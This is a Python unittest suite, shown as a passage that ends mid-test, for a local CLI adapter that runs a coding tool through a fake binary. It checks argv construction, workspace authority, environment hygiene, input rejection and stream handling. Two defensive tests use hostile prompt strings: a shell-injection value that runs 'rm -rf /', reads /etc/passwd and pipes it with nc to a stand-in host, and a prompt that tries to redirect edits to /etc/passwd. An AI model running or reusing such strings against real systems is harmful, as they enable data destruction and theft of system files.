"""Worker-local ZCode adapter tests (M07 Stage 2, D-061): fake CLI only.

Deterministic and CI-safe: the fake CLI (tests/zcode_fake_cli.py) stands
in for the real runtime exactly like the Codex adapter suite's fake App
Server. No test executes a real ZCode binary, contacts any account or
consumes any quota. The suite pins the D-061 implementation constraints:

- the one argv vector (prompt/path/mode strictly data; ``--mode build``
  always explicit; ``stream-json`` always selected; no shell anywhere);
- workspace authority (one administrator-authorized project workspace,
  canonicalized with realpath, passed as both ``--cwd`` and process cwd;
  ambient cwd, request paths and adapter state are never substituted);
- honest discovery (installed is not eligible: version + doctor probes,
  non-inference only, unverified auth never upgraded);
- the terminal contract (result line AND exit 0; every other ending is a
  typed failure or an explicit unknown — never fabricated);
- bounded streaming (line/total/event/unknown/stderr budgets, concurrent
  stderr drained and never surfaced);
- lifecycle (exactly one invocation, no retry, cancellation and timeout
  through the full path, child reaped);
- hygiene (minimal child environment, no inherited secrets surfaced,
  closed safe notes only).
"""

from __future__ import annotations

import dataclasses
import json
import os
import subprocess
import sys
import threading
import time
import unittest
from collections.abc import Callable
from datetime import datetime, timedelta, timezone
from pathlib import Path
from tempfile import TemporaryDirectory
from typing import cast, override

REPO = Path(__file__).resolve().parents[1]
if str(REPO) not in sys.path:
    sys.path.insert(0, str(REPO))

from scarcity_router.gateway_adapters import (  # noqa: E402
    AdapterCall,
    AdapterMessage,
    AdapterResult,
    AdapterStreamChunk,
)
from scarcity_router.model_inventory import (  # noqa: E402
    SOURCE_KINDS,
    SourceInventory,
)
from scarcity_router.resource_state import ResourceIdentity  # noqa: E402
from scarcity_router.selection_types import ModelIdentity  # noqa: E402
from scarcity_router.worker_client import (  # noqa: E402
    WorkerConfigError,
    build_registry,
)
from scarcity_router.worker_codex_adapter import CodexSpawnSpec  # noqa: E402
from scarcity_router.worker_zcode_adapter import (  # noqa: E402
    MAX_PROMPT_BYTES,
    PLAN_LANE_SLUG,
    ZCODE_PROVIDER,
    ZCodeIneligible,
    ZCodeLocalAdapter,
    ZCodeProtocolFailure,
    build_run_argv,
    discover_zcode_binary,
    map_prompt,
    parse_run_result,
    probe_zcode_doctor,
    probe_zcode_version,
)

FAKE = Path(__file__).resolve().parent / "zcode_fake_cli.py"
_ = os.chmod(FAKE, 0o755)

SUPPORTED_VERSION = "0.16.9"


def _canonical(moment: datetime) -> str:
    return (
        moment.astimezone(timezone.utc)
        .isoformat(timespec="milliseconds")
        .replace("+00:00", "Z")
    )


def _future_deadline(seconds: float = 30.0) -> str:
    return _canonical(datetime.now(timezone.utc) + timedelta(seconds=seconds))


class FakeZCodeSpawner:
    """The injected process seam: launches the scripted fake binary.

    The scenario document travels as a temp FILE path (never an argv
    element): scenarios carry multi-megabyte responses, and Linux caps a
    single argument at 128 KiB — the same ceiling the adapter's prompt
    bound respects.
    """

    def __init__(
        self,
        scenario: dict[str, object] | None = None,
        *,
        version: str = SUPPORTED_VERSION,
        version_exit: int = 0,
        doctor_exit: int = 0,
        doctor_doc: object | None = None,
        trace_path: str | None = None,
    ) -> None:
        self.run_scenario: dict[str, object] = scenario or {}
        self.version: str = version
        self.version_exit: int = version_exit
        self.doctor_exit: int = doctor_exit
        self.doctor_doc: object | None = doctor_doc
        self.trace_path: str | None = trace_path
        self._scenario_dir: TemporaryDirectory[str] = TemporaryDirectory()
        self.specs: list[CodexSpawnSpec] = []
        self.run_specs: list[CodexSpawnSpec] = []
        self.processes: list["subprocess.Popen[bytes]"] = []

    def _scenario_file(self, payload: dict[str, object]) -> str:
        path = Path(self._scenario_dir.name) / f"scenario-{len(self.processes)}.json"
        _ = path.write_text(json.dumps(payload), encoding="utf-8")
        return str(path)

    def __call__(self, spec: CodexSpawnSpec) -> "subprocess.Popen[bytes]":
        self.specs.append(spec)
        argv = spec.argv
        if list(argv[1:2]) == ["--version"]:
            mode_args = [
                "version",
                self._scenario_file(
                    {"version": self.version, "version_exit": self.version_exit}
                ),
            ]
        elif list(argv[1:2]) == ["doctor"]:
            doctor_scenario: dict[str, object] = {"doctor_exit": self.doctor_exit}
            if self.doctor_doc is not None:
                doctor_scenario["doctor"] = self.doctor_doc
            mode_args = ["doctor", self._scenario_file(doctor_scenario)]
        else:
            self.run_specs.append(spec)
            mode_args = ["run", self._scenario_file(dict(self.run_scenario))]
        env = dict(spec.env)
        if self.trace_path:
            env["SR_ZCODE_FAKE_TRACE"] = self.trace_path
        proc = subprocess.Popen(  # noqa: S603 - test-controlled fixed argv
            [sys.executable, str(FAKE), *mode_args],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            cwd=spec.cwd,
            start_new_session=True,
        )
        self.processes.append(proc)
        return proc

    def reap_all(self) -> None:
        for proc in self.processes:
            if proc.poll() is None:
                proc.kill()
            _ = proc.wait(timeout=5)
            for stream in (proc.stdin, proc.stdout, proc.stderr):
                if stream is not None:
                    try:
                        stream.close()
                    except (OSError, ValueError):
                        pass
        self.processes.clear()
        self._scenario_dir.cleanup()

    def all_reaped(self) -> bool:
        return all(proc.poll() is not None for proc in self.processes)


class Harness:
    """One test case's adapter + spawner + trace + temp state directory."""

    state_dir: Path
    workspace_real: Path
    workspace: Path
    bin_path: Path
    trace_path: Path
    spawner: FakeZCodeSpawner
    adapter: ZCodeLocalAdapter

    def __init__(  # noqa: PLR0913 - test seam
        self,
        scenario: dict[str, object] | None = None,
        *,
        version: str = SUPPORTED_VERSION,
        version_exit: int = 0,
        doctor_exit: int = 0,
        doctor_doc: object | None = None,
        source_id: str = "zc1",
        inventory_ttl_seconds: float = 300.0,
        workspace_name: str = "my project dir-1.2",
        pinned_missing: bool = False,
        clock: Callable[[], float] | None = None,
    ) -> None:
        self._tmp: TemporaryDirectory[str] = TemporaryDirectory()
        base = Path(self._tmp.name)
        # A space in the workspace name proves unusual but valid project
        # paths stay safe end to end; the configured path is a SYMLINK to
        # the real directory, pinning that canonicalization happens
        # (ZCode must receive the real directory, never the alias).
        self.state_dir = base / "state"
        _ = self.state_dir.mkdir()
        self.workspace_real = base / "project"
        _ = self.workspace_real.mkdir()
        self.workspace = base / workspace_name
        os.symlink(self.workspace_real, self.workspace)
        self.bin_path = base / "bin-zcode"
        if not pinned_missing:
            _ = self.bin_path.write_bytes(b"#!/bin/sh\nexit 0\n")
            _ = os.chmod(self.bin_path, 0o755)
        self.trace_path = base / "trace.jsonl"
        _ = self.trace_path.write_text("")
        self.spawner = FakeZCodeSpawner(
            scenario,
            version=version,
            version_exit=version_exit,
            doctor_exit=doctor_exit,
            doctor_doc=doctor_doc,
            trace_path=str(self.trace_path),
        )
        adapter_kwargs: dict[str, object] = {"inventory_ttl_seconds": inventory_ttl_seconds}
        if clock is not None:
            adapter_kwargs["clock"] = clock
        self.adapter = ZCodeLocalAdapter(
            source_id=source_id,
            authorized_workspace=self.workspace,
            pinned_binary=self.bin_path,
            spawner=self.spawner,
            **adapter_kwargs,  # pyright: ignore[reportArgumentType] - typed keyword helper
        )

    def path_lookup(self, name: str) -> str | None:
        _ = name
        return str(self.bin_path)

    def trace_records(self) -> list[dict[str, object]]:
        records: list[dict[str, object]] = []
        for line in self.trace_path.read_text(encoding="utf-8").splitlines():
            if line.strip():
                records.append(cast("dict[str, object]", json.loads(line)))
        return records

    def close(self) -> None:
        self.spawner.reap_all()
        self._tmp.cleanup()


def _lane(source_id: str = "zc1") -> ResourceIdentity:
    """The adapter's own lane resource identity (as the registry binds it)."""
    return ResourceIdentity(
        resource_id=f"{source_id}:{PLAN_LANE_SLUG}",
        channel="worker_bridged",
        provider=ZCODE_PROVIDER,
        model=PLAN_LANE_SLUG,
        entitlement="subscription_included",
    )


def _call(
    *,
    prompt: str = "hi",
    resource: ResourceIdentity | None = None,
    messages: tuple[AdapterMessage, ...] | None = None,
    stream: bool = False,
    tools: tuple[dict[str, object], ...] = (),
    response_format: dict[str, object] | None = None,
    reasoning_effort: str | None = None,
    max_output_tokens: int | None = None,
    generation_params: dict[str, object] | None = None,
) -> AdapterCall:
    return AdapterCall(
        resource=resource if resource is not None else _lane(),
        model=ModelIdentity(provider="zai", model="glm-5.3", variant="max"),
        messages=messages
        if messages is not None
        else (AdapterMessage(role="user", content=prompt),),
        stream=stream,
        tools=tools,
        response_format=response_format,
        reasoning_effort=reasoning_effort,
        max_output_tokens=max_output_tokens,
        generation_params=generation_params or {},
    )


def _chunks() -> Callable[[AdapterStreamChunk], None]:
    def emit(chunk: AdapterStreamChunk) -> None:
        _ = chunk.kind  # the adapter synthesizes no text deltas; nothing to collect

    return emit


# ── Discovery / capability ────────────────────────────────────────────────────


class DiscoveryTests(unittest.TestCase):
    harness: Harness

    def __init__(self, method_name: str = "runTest") -> None:
        self.harness = Harness()
        super().__init__(method_name)

    @override
    def setUp(self) -> None:
        self.harness.close()
        self.harness = Harness()


    @override
    def tearDown(self) -> None:
        self.harness.close()

    def test_missing_binary_is_unavailable_with_empty_models(self) -> None:
        self.harness.close()
        self.harness = Harness(pinned_missing=True)
        inventory = self.harness.adapter.observe_inventory()
        self.assertEqual(inventory.auth_state, "unavailable")
        self.assertEqual(inventory.runtime_version, "")
        self.assertEqual(inventory.models, ())
        self.assertEqual(inventory.kind, "zcode_subscription")
        self.assertEqual(inventory.runtime_name, "zcode")
        self.assertEqual(self.harness.adapter.resource_ids, ())

    def test_supported_installation_reports_unverified_with_lane(self) -> None:
        inventory = self.harness.adapter.observe_inventory()
        self.assertEqual(inventory.auth_state, "unverified")
        self.assertEqual(inventory.runtime_version, SUPPORTED_VERSION)
        self.assertEqual(
            [model.slug for model in inventory.models], [PLAN_LANE_SLUG]
        )
        self.assertEqual(
            inventory.models[0].reasoning_efforts,
            (),
            "the plan lane claims no reasoning efforts",
        )
        self.assertEqual(
            self.harness.adapter.resource_ids,
            (self.harness.adapter.lane_resource_id,),
        )

    def test_unsupported_version_is_unavailable(self) -> None:
        self.harness.close()
        self.harness = Harness(version="0.15.2")
        inventory = self.harness.adapter.observe_inventory()
        self.assertEqual(inventory.auth_state, "unavailable")
        self.assertEqual(inventory.models, ())
        self.assertEqual(self.harness.adapter.resource_ids, ())

    def test_unparseable_version_is_unavailable(self) -> None:
        self.harness.close()
        self.harness = Harness(version="not-a-version")
        inventory = self.harness.adapter.observe_inventory()
        self.assertEqual(inventory.auth_state, "unavailable")

    def test_version_probe_failure_is_unavailable(self) -> None:
        self.harness.close()
        self.harness = Harness(version_exit=3)
        inventory = self.harness.adapter.observe_inventory()
        self.assertEqual(inventory.auth_state, "unavailable")

    def test_malformed_doctor_document_is_unavailable(self) -> None:
        self.harness.close()
        self.harness = Harness(doctor_doc={"runtime": {"no": "cli member"}})
        inventory = self.harness.adapter.observe_inventory()
        self.assertEqual(inventory.auth_state, "unavailable")

    def test_failing_doctor_is_unavailable(self) -> None:
        self.harness.close()
        self.harness = Harness(doctor_exit=1)
        inventory = self.harness.adapter.observe_inventory()
        self.assertEqual(inventory.auth_state, "unavailable")

    def test_source_flips_to_unavailable_when_probes_start_failing(self) -> None:
        _ = self.harness.adapter.observe_inventory()
        self.assertEqual(
            self.harness.adapter.resource_ids,
            (self.harness.adapter.lane_resource_id,),
        )
        self.harness.spawner.version = "0.9.0"
        inventory = self.harness.adapter.observe_inventory()
        self.assertEqual(inventory.auth_state, "unavailable")
        self.assertEqual(self.harness.adapter.resource_ids, ())

    def test_inventory_ttl_governs_due_observations(self) -> None:
        self.harness.close()
        clock = {"now": 1000.0}
        harness = Harness(
            inventory_ttl_seconds=300.0, clock=lambda: clock["now"]
        )
        try:
            self.assertTrue(harness.adapter.inventory_if_due())
            _ = harness.adapter.observe_inventory(now=clock["now"])
            self.assertFalse(harness.adapter.inventory_if_due())
            clock["now"] += 299.0
            self.assertFalse(harness.adapter.inventory_if_due())
            clock["now"] += 1.0
            self.assertTrue(harness.adapter.inventory_if_due())
            harness.adapter.refresh_inventory_if_due()
            self.assertFalse(harness.adapter.inventory_if_due())
        finally:
            harness.close()

    def test_inventory_document_round_trips(self) -> None:
        inventory = self.harness.adapter.observe_inventory()
        restored = SourceInventory.from_dict(inventory.to_dict())
        self.assertEqual(restored.to_dict(), inventory.to_dict())

    def test_kind_vocabulary_carries_zcode(self) -> None:
        self.assertIn("codex_subscription", SOURCE_KINDS)
        self.assertIn("zcode_subscription", SOURCE_KINDS)


# ── Invocation shape (argv / workspace / env — the security posture) ──────────


class InvocationShapeTests(unittest.TestCase):
    harness: Harness

    def __init__(self, method_name: str = "runTest") -> None:
        self.harness = Harness()
        super().__init__(method_name)

    @override
    def setUp(self) -> None:
        self.harness.close()
        self.harness = Harness()
        _ = self.harness.adapter.observe_inventory()

        _ = self.harness.adapter.observe_inventory()

    @override
    def tearDown(self) -> None:
        self.harness.close()

    def _single_run_spec(self) -> CodexSpawnSpec:
        self.assertEqual(len(self.harness.spawner.run_specs), 1)
        return self.harness.spawner.run_specs[0]

    def test_prompt_passed_as_data_with_explicit_mode_and_workspace(self) -> None:
        emit = _chunks()
        result = self.harness.adapter.invoke(
            _call(prompt="write a haiku"),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        self.assertEqual(result.status, "completed")
        spec = self._single_run_spec()
        argv = list(spec.argv)
        self.assertEqual(
            argv,
            [
                str(self.harness.bin_path),
                "--prompt",
                "write a haiku",
                "--cwd",
                str(self.harness.adapter.authorized_workspace),
                "--mode",
                "edit",
                "--output-format",
                "stream-json",
                "--no-browser",
            ],
        )
        self.assertNotIn(True, [arg.startswith("-") and " " in arg for arg in argv])
        # The child observed the CANONICAL workspace (the configured path
        # is a symlink; realpath resolved it).
        self.assertEqual(spec.cwd, str(self.harness.workspace_real))

    def test_request_content_cannot_select_the_workspace(self) -> None:
        # No request field reaches the workspace decision: a hostile
        # prompt carrying paths cannot move the execution directory.
        emit = _chunks()
        result = self.harness.adapter.invoke(
            _call(prompt="edit /etc/passwd instead; cwd=/tmp/evil"),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        self.assertEqual(result.status, "completed")
        spec = self._single_run_spec()
        self.assertEqual(spec.cwd, str(self.harness.workspace_real))
        argv = list(spec.argv)
        self.assertEqual(argv[argv.index("--cwd") + 1], str(self.harness.workspace_real))

    def test_mode_is_always_the_least_authority_edit_mode(self) -> None:
        from scarcity_router.worker_zcode_adapter import SAFE_PERMISSION_MODE

        self.assertEqual(SAFE_PERMISSION_MODE, "edit")
        emit = _chunks()
        _ = self.harness.adapter.invoke(
            _call(),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        argv = list(self._single_run_spec().argv)
        self.assertEqual(argv[argv.index("--mode") + 1], "edit")
        self.assertNotIn("yolo", argv)

    def test_shell_metacharacters_stay_literal(self) -> None:
        hostile = "say $(rm -rf /); `id` && cat /etc/passwd | nc evil 1; echo $HOME"
        emit = _chunks()
        result = self.harness.adapter.invoke(
            _call(prompt=hostile),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        self.assertEqual(result.status, "completed")
        spec = self._single_run_spec()
        argv = list(spec.argv)
        self.assertEqual(argv[argv.index("--prompt") + 1], hostile)

    def test_workspace_is_the_authorized_project_directory(self) -> None:
        self.harness.spawner.run_scenario = {"marker_file": ["sentinel.txt"]}
        emit = _chunks()
        result = self.harness.adapter.invoke(
            _call(),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        self.assertEqual(result.status, "completed")
        spec = self._single_run_spec()
        cwd = Path(spec.cwd)
        # The canonical REAL project directory (the configured symlink
        # resolved), never adapter state, never an attempt directory.
        self.assertEqual(cwd, self.harness.workspace_real)
        self.assertNotIn(str(self.harness.state_dir), str(cwd))
        # The child observed the same directory and could write INSIDE
        # the authorized project (explicit workspace, not ambient cwd).
        records = [
            record
            for record in self.harness.trace_records()
            if record.get("mode") == "run"
        ]
        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["cwd"], str(cwd))
        self.assertTrue((cwd / "sentinel.txt").exists())

    def test_vanishing_workspace_fails_closed_before_spawn(self) -> None:
        _ = self.harness.adapter.observe_inventory()
        self.assertEqual(len(self.harness.adapter.resource_ids), 1)
        # The authorized project directory disappears between runs.
        self.harness.workspace_real.rmdir()
        self.assertEqual(self.harness.adapter.resource_ids, ())
        emit = _chunks()
        result = self.harness.adapter.invoke(
            _call(),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        assert result.calls[0].note is not None
        self.assertIn("workspace_unavailable", result.calls[0].note)
        self.assertEqual(self.harness.spawner.run_specs, [])

    def test_replacing_project_directory_does_not_renew_workspace_authority(self) -> None:
        old_project = self.harness.workspace_real.with_name("original-project")
        _ = self.harness.workspace_real.rename(old_project)
        self.harness.workspace_real.mkdir()
        self.assertEqual(self.harness.adapter.resource_ids, ())
        result = self.harness.adapter.invoke(
            _call(), cancel_event=threading.Event(), deadline=_future_deadline(), emit=_chunks(),
        )
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        self.assertEqual(result.calls[0].note, "workspace_invalid")
        self.assertEqual(self.harness.spawner.run_specs, [])

    def test_workspace_is_rechecked_after_non_inference_probes(self) -> None:
        spawner = self.harness.spawner
        workspace = self.harness.workspace_real

        def replacing_probe(spec: CodexSpawnSpec) -> subprocess.Popen[bytes]:
            proc = spawner(spec)
            if list(spec.argv[1:2]) == ["doctor"]:
                _ = workspace.rename(workspace.with_name("original-project"))
                workspace.mkdir()
            return proc

        adapter = ZCodeLocalAdapter(
            source_id="zc1", authorized_workspace=workspace,
            pinned_binary=self.harness.bin_path, spawner=replacing_probe,
        )
        result = adapter.invoke(
            _call(), cancel_event=threading.Event(), deadline=_future_deadline(), emit=_chunks(),
        )
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        self.assertEqual(result.calls[0].note, "workspace_invalid")
        self.assertEqual(spawner.run_specs, [])

    def test_child_environment_is_minimal(self) -> None:
        emit = _chunks()
        result = self.harness.adapter.invoke(
            _call(),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        self.assertEqual(result.status, "completed")
        spec = self._single_run_spec()
        env = dict(spec.env)
        self.assertLessEqual(set(env.keys()), {"PATH", "HOME"})

    def test_no_shell_invocation_exists_in_the_spec(self) -> None:
        emit = _chunks()
        _ = self.harness.adapter.invoke(
            _call(),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        spec = self._single_run_spec()
        # The spawn spec carries only argv/env/cwd: there is no shell
        # field to set, and the shared spawn helper is the argv-only
        # Popen seam (no shell=True exists on the path).
        self.assertEqual(
            {field.name for field in dataclasses.fields(CodexSpawnSpec)},
            {"argv", "env", "cwd"},
        )
        self.assertNotIn(True, [isinstance(arg, list) for arg in spec.argv])

    def test_probes_do_not_carry_prompt_content(self) -> None:
        self.harness.spawner.specs.clear()
        emit = _chunks()
        _ = self.harness.adapter.invoke(
            _call(prompt="SECRET-PROJECT-CODE-XYZ"),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        probe_specs = [
            spec
            for spec in self.harness.spawner.specs
            if list(spec.argv[1:2]) in (["--version"], ["doctor"])
        ]
        self.assertEqual(len(probe_specs), 2)
        for spec in probe_specs:
            argv = " ".join(str(item) for item in spec.argv)
            env = json.dumps(dict(spec.env))
            self.assertNotIn("SECRET-PROJECT-CODE-XYZ", argv)
            self.assertNotIn("SECRET-PROJECT-CODE-XYZ", env)


class PreflightRejectionTests(unittest.TestCase):
    """Typed rejections BEFORE anything executes (no run spawned)."""

    harness: Harness

    def __init__(self, method_name: str = "runTest") -> None:
        self.harness = Harness()
        super().__init__(method_name)

    @override
    def setUp(self) -> None:
        self.harness.close()
        self.harness = Harness()
        _ = self.harness.adapter.observe_inventory()
        _ = self.harness.adapter.observe_inventory()

    @override
    def tearDown(self) -> None:
        self.harness.close()

    def _assert_preflight(self, call: AdapterCall, reason: str) -> None:
        emit = _chunks()
        result = self.harness.adapter.invoke(
            call,
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        self.assertEqual(result.status, "failed")
        assert result.calls is not None and len(result.calls) == 1
        assert result.calls[0].note is not None
        self.assertIn(reason, result.calls[0].note)
        self.assertEqual(self.harness.spawner.run_specs, [])

    def test_client_tools_rejected(self) -> None:
        self._assert_preflight(
            _call(tools=({"type": "function", "name": "f"},)),
            "tool_calls_unsupported",
        )

    def test_output_limit_rejected(self) -> None:
        self._assert_preflight(
            _call(max_output_tokens=100), "output_limit_unenforceable"
        )

    def test_generation_params_rejected(self) -> None:
        self._assert_preflight(
            _call(generation_params={"temperature": 1.0}),
            "request_parameters_unsupported",
        )

    def test_structured_output_rejected(self) -> None:
        self._assert_preflight(
            _call(
                response_format={
                    "type": "json_schema",
                    "json_schema": {"schema": {"type": "object"}},
                }
            ),
            "response_format_unsupported",
        )

    def test_reasoning_effort_rejected(self) -> None:
        self._assert_preflight(
            _call(reasoning_effort="max"), "reasoning_effort_not_enforceable"
        )

    def test_multi_message_conversation_rejected(self) -> None:
        self._assert_preflight(
            _call(
                messages=(
                    AdapterMessage(role="user", content="first"),
                    AdapterMessage(role="assistant", content="reply"),
                    AdapterMessage(role="user", content="second"),
                )
            ),
            "conversation_shape_unsupported",
        )

    def test_system_message_rejected(self) -> None:
        self._assert_preflight(
            _call(
                messages=(
                    AdapterMessage(role="system", content="be nice"),
                    AdapterMessage(role="user", content="hi"),
                )
            ),
            "conversation_shape_unsupported",
        )

    def test_tool_message_rejected(self) -> None:
        self._assert_preflight(
            _call(
                messages=(
                    AdapterMessage(role="tool", content="result", tool_call_id="c1"),
                )
            ),
            "tool_messages_unsupported",
        )

    def test_empty_content_rejected(self) -> None:
        self._assert_preflight(
            _call(messages=(AdapterMessage(role="user", content=""),)),
            "empty_message_unsupported",
        )

    def test_oversize_prompt_rejected(self) -> None:
        self._assert_preflight(
            _call(prompt="x" * (MAX_PROMPT_BYTES + 1)), "prompt_too_large"
        )

    def test_foreign_resource_rejected(self) -> None:
        self._assert_preflight(
            _call(
                resource=ResourceIdentity(
                    resource_id="other:plan-managed",
                    channel="worker_bridged",
                    provider=ZCODE_PROVIDER,
                    model=PLAN_LANE_SLUG,
                    entitlement="subscription_included",
                )
            ),
            "resource_not_served",
        )

    def test_foreign_provider_or_model_rejected(self) -> None:
        self._assert_preflight(
            _call(
                resource=ResourceIdentity(
                    resource_id="zc1:plan-managed",
                    channel="worker_bridged",
                    provider="openai",
                    model=PLAN_LANE_SLUG,
                    entitlement="subscription_included",
                )
            ),
            "resource_not_served",
        )
        self._assert_preflight(
            _call(
                resource=ResourceIdentity(
                    resource_id="zc1:plan-managed",
                    channel="worker_bridged",
                    provider=ZCODE_PROVIDER,
                    model="glm-5.3",
                    entitlement="subscription_included",
                )
            ),
            "resource_not_served",
        )

    def test_probe_failure_at_invoke_time_fails_closed(self) -> None:
        self.harness.spawner.version = "0.1.2"
        emit = _chunks()
        result = self.harness.adapter.invoke(
            _call(),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        assert result.calls[0].note is not None
        self.assertIn("version_unsupported", result.calls[0].note)
        self.assertEqual(self.harness.spawner.run_specs, [])

    def test_no_run_spawned_for_rejections_keeps_binary_absent(self) -> None:
        # Rejections never spawn the runtime: no quota, no side effects.
        runs_before = len(self.harness.spawner.run_specs)
        processes_before = len(self.harness.spawner.processes)
        emit = _chunks()
        _ = self.harness.adapter.invoke(
            _call(tools=({"type": "function", "name": "f"},)),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )
        self.assertEqual(len(self.harness.spawner.run_specs), runs_before)
        self.assertEqual(len(self.harness.spawner.processes), processes_before)


# ── Streaming (bounded consumption; terminal-contract classification) ─────────


class StreamingTests(unittest.TestCase):
    harness: Harness

    def __init__(self, method_name: str = "runTest") -> None:
        self.harness = Harness()
        super().__init__(method_name)

    @override
    def setUp(self) -> None:
        self.harness.close()
        self.harness = Harness()
        _ = self.harness.adapter.observe_inventory()

        _ = self.harness.adapter.observe_inventory()

    @override
    def tearDown(self) -> None:
        self.harness.close()

    def _invoke(
        self, scenario: dict[str, object] | None = None
    ) -> AdapterResult:
        if scenario is not None:
            self.harness.spawner.run_scenario = scenario
        emit = _chunks()
        return self.harness.adapter.invoke(
            _call(),
            cancel_event=threading.Event(),
            deadline=_future_deadline(),
            emit=emit,
        )

    def test_progress_events_then_result_completes(self) -> None:
        result = self._invoke(
            {
                "events": [
                    {"type": "session.titleUpdated", "title": "t"},
                    {"type": "turn.started"},
                    {"type": "session.updated"},
                ],
                "result": {
                    "type": "result",
                    "sessionId": "sess-9",
                    "response": "the answer",
                    "projection": {"status": "success"},
                },
            }
        )
        self.assertEqual(result.status, "completed")
        assert result.message is not None
        self.assertEqual(result.message.content, "the answer")
        self.assertEqual(result.finish_reason, "stop")
        assert result.calls is not None
        note = result.calls[0].note or ""
        self.assertIn(f"zcode {SUPPORTED_VERSION}", note)
        self.assertIn("mode=edit", note)
        self.assertIn("session sess-9", note)
        self.assertIsNone(result.calls[0].provider_reported_usage)

    def test_unknown_event_types_are_tolerated_and_bounded(self) -> None:
        result = self._invoke(
            {
                "events": [{"type": "future.feature"}, {"type": "another.unknown"}],
            }
        )
        self.assertEqual(result.status, "completed")

    def test_malformed_line_fails_closed(self) -> None:
        result = self._invoke({"events": ["definitely not json"]})
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        assert result.calls[0].note is not None
        self.assertIn("protocol_malformed", result.calls[0].note)

    def test_non_object_event_fails_closed(self) -> None:
        result = self._invoke({"events": ['"[\"array\"]"']})
        self.assertEqual(result.status, "failed")

    def test_event_without_type_fails_closed(self) -> None:
        result = self._invoke({"events": [{"payload": 1}]})
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        assert result.calls[0].note is not None
        self.assertIn("protocol_malformed", result.calls[0].note)

    def test_result_without_response_fails_closed(self) -> None:
        result = self._invoke(
            {"result": {"type": "result", "sessionId": "s"}}
        )
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        assert result.calls[0].note is not None
        self.assertIn("result_malformed", result.calls[0].note)

    def test_result_with_non_string_response_fails_closed(self) -> None:
        result = self._invoke(
            {"result": {"type": "result", "response": 42}}
        )
        self.assertEqual(result.status, "failed")

    def test_result_with_mistyped_projection_fails_closed(self) -> None:
        result = self._invoke(
            {
                "result": {
                    "type": "result",
                    "response": "ok",
                    "projection": {"status": 17},
                }
            }
        )
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        assert result.calls[0].note is not None
        self.assertIn("result_malformed", result.calls[0].note)

    def test_large_bounded_response_completes(self) -> None:
        big = "x" * (2 * 1024 * 1024)
        result = self._invoke({"result": {"type": "result", "response": big}})
        self.assertEqual(result.status, "completed")
        assert result.message is not None
        self.assertEqual(result.message.content, big)

    def test_partial_line_delivery_still_parses(self) -> None:
        result = self._invoke({"partial_line": True})
        self.assertEqual(result.status, "completed")
        assert result.message is not None
        self.assertEqual(result.message.content, "synthetic answer")

    def test_concurrent_stderr_never_surfaces(self) -> None:
        result = self._invoke(
            {
                "stderr": "Error: internal provider details (traceId: abc)\n",
                "events": [{"type": "turn.started"}],
            }
        )
        self.assertEqual(result.status, "completed")
        rendered = json.dumps(
            {
                "status": result.status,
                "note": (result.calls[0].note if result.calls else None),
                "content": (result.message.content if result.message else None),
            }
        )
        self.assertNotIn("provider details", rendered)
        self.assertNotIn("traceId: abc", rendered)

    def test_oversized_stream_line_fails_closed(self) -> None:
        # A single line beyond the line budget is drift, never truncation:
        # the terminal-result line bound is 8 MiB + 64 KiB, so a ~9 MiB
        # progress line must fail closed.
        result = self._invoke(
            {"events": [{"type": "session.updated", "blob": "y" * (9 * 1024 * 1024)}]}
        )
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        assert result.calls[0].note is not None
        self.assertIn("stream_budget_exceeded", result.calls[0].note)


# ── Lifecycle (terminal contract; cancellation; timeout; cleanup) ─────────────


class LifecycleTests(unittest.TestCase):
    harness: Harness

    def __init__(self, method_name: str = "runTest") -> None:
        self.harness = Harness()
        super().__init__(method_name)

    @override
    def setUp(self) -> None:
        self.harness.close()
        self.harness = Harness()
        _ = self.harness.adapter.observe_inventory()

        _ = self.harness.adapter.observe_inventory()

    @override
    def tearDown(self) -> None:
        self.harness.close()

    def _invoke(
        self,
        scenario: dict[str, object] | None = None,
        deadline: str | None = None,
    ) -> AdapterResult:
        if scenario is not None:
            self.harness.spawner.run_scenario = scenario
        emit = _chunks()
        return self.harness.adapter.invoke(
            _call(),
            cancel_event=threading.Event(),
            deadline=deadline or _future_deadline(),
            emit=emit,
        )

    def test_normal_completion(self) -> None:
        result = self._invoke()
        self.assertEqual(result.status, "completed")
        assert result.calls is not None
        self.assertEqual(result.calls[0].status, "completed")
        self.assertTrue(self.harness.spawner.all_reaped())

    def test_nonzero_exit_is_a_typed_failure(self) -> None:
        result = self._invoke({"exit_code": 1, "stderr": "Error: boom (traceId: t)\n"})
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        self.assertEqual(result.calls[0].status, "failed")
        assert result.calls[0].note is not None
        self.assertEqual(result.calls[0].note, "zcode_run_failed_exit_1")
        self.assertNotIn("boom", result.calls[0].note)

    def test_result_with_failing_exit_contracts_as_failure(self) -> None:
        result = self._invoke({"exit_code": 2})
        self.assertEqual(result.status, "failed")
        assert result.calls is not None
        assert result.calls[0].note is not None
        self.assertIn("zcode_run_failed_exit_2", result.calls[0].note)

    def test_clean_exit_without_result_is_unknown_not_completed(self) -> None:
        result = self._invoke({"omit_result": True, "exit_code": 0})
